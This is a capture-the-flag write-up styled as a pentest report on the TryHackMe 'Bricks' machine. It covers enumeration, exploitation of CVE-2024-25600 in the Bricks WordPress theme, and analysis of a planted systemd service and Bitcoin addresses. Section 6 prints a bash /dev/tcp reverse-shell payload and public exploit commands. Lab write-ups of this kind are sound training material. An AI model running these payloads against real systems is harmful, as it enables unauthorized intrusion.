# TryHackMe - Bricks  
Professional Penetration Testing Report  
Author: Bosota-the-boron 
Date: 12/09/2025

---

## Table of Contents
1. Introduction
2. Scope and Objectives
3. Methodology
4. Enumeration
5. Vulnerability Identification
6. Exploitation
7. Post-Exploitation Findings
8. OSINT Analysis
9. Conclusion

---

## 1. Introduction
This document provides a full technical analysis and exploitation path for the TryHackMe "Bricks" machine.  
The assessment followed a structured penetration testing methodology, including reconnaissance, vulnerability identification, exploitation, and post-exploitation investigation.

---

## 2. Scope and Objectives

**Target:** `10.80.180.100`  
**Objective:**  
- Enumerate exposed services  
- Identify vulnerabilities  
- Achieve remote code execution  
- Escalate privileges  
- Analyze any malicious or suspicious components present on the system  
- Collect OSINT indicators when applicable  

---

## 3. Methodology
The following methodology was applied:

1. Network and service enumeration  
2. Web application fingerprinting  
3. WordPress analysis  
4. Remote Exploitation (CVE‑2024‑25600)  
5. Privilege escalation  
6. Malware and persistence inspection  
7. OSINT investigation of discovered indicators  

---

## 4. Enumeration

### 4.1 Nmap Scan

Command:
```
nmap -sC -sV -sS -Pn -p- -T4 10.80.180.100
```

Key results:
```
22/tcp    SSH - OpenSSH 8.2p1 Ubuntu
80/tcp    HTTP - WebSockify Python/3.8.10
443/tcp   HTTPS - Apache httpd, WordPress 6.5
3306/tcp  MySQL (unauthorized)
```

### 4.2 Web Enumeration

Inspection of HTTPS revealed a WordPress instance using the Bricks theme.  
The `/robots.txt` file referenced `/wp-admin/` and `/wp-admin/admin-ajax.php`, confirming WordPress functionality.

### 4.3 WPScan Analysis
```
wpscan --url https://bricks.thm --disable-tls-checks
```

Findings:
- WordPress version: 6.5  
- Theme: Bricks 1.9.5  
- XML-RPC enabled  
- No plugins detected  

A critical vulnerability was identified in the detected theme version.

---

## 5. Vulnerability Identification

The Bricks theme version **1.9.5** is vulnerable to a critical unauthenticated remote code execution vulnerability:

**CVE‑2024‑25600 – Bricks Builder Remote Code Execution**

Public exploit used:
https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT

---

## 6. Exploitation

### 6.1 Exploit Dependencies
```
python3.8 -m pip install rich --upgrade
pip install prompt_toolkit
pip install alive-progress
```

### 6.2 Exploit Execution
```
python3 CVE-2024-25600.py -u http://bricks.thm
```

A reverse shell listener was prepared:
```
nc -nlvp 4444
```

Payload used:
```
bash -c 'exec bash -i &>/dev/tcp/<YOUR-IP>/4444 <&1'
```

This yielded direct **root** access on the target system.

---

## 7. Post-Exploitation Findings

### 7.1 Flag Extraction
A file containing the first flag was located:
```
650c844110baced87e1606453b93f22a.txt
```

Content:
```
FLAGHERE
```

### 7.2 Suspicious systemd Service

Running services:
```
systemctl list-units --type=service --state=running
```

A suspicious service named `ubuntu.service` with description `TRYHACK3M` was identified.

Inspecting the service:
```
systemctl cat ubuntu.service
```

It referenced:
```
/lib/NetworkManager/nm-init.dialog
```

### 7.3 Malicious Configuration File

The file `/lib/NetworkManager/inet.conf` contained an encoded string:
```
5757314e65474e5962484a4f656d787457544e424e574648...
```

Decoded (Hex → Raw), this revealed two Bitcoin addresses:
```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa
```

---

## 8. OSINT Analysis

The first Bitcoin address was examined:
```
https://www.blockchain.com/explorer/addresses/btc/bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```

A transaction linked to:
```
bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r
```

This sender address appears in OpenSanctions:
```
https://www.opensanctions.org/entities/ofac-4d99af7cc172df2b9fbb833cb5af39dbbc011a2c/
```

This suggests the malicious service mimics or references cryptocurrency wallets associated with sanctioned entities, indicating simulated malware or exfiltration behavior.

---

## 9. Conclusion

The Bricks machine showcases the risks posed by outdated WordPress components.  
By exploiting a publicly available RCE vulnerability (CVE‑2024‑25600), full system compromise was achieved.

Key accomplishments:
- Discovery of an exposed WordPress installation  
- Identification of vulnerable Bricks theme  
- Successful root-level RCE  
- Investigation of a malicious systemd persistence mechanism  
- OSINT analysis of cryptocurrency-related artifacts  

This room effectively simulates real-world exploitation combined with threat intelligence investigation.

---
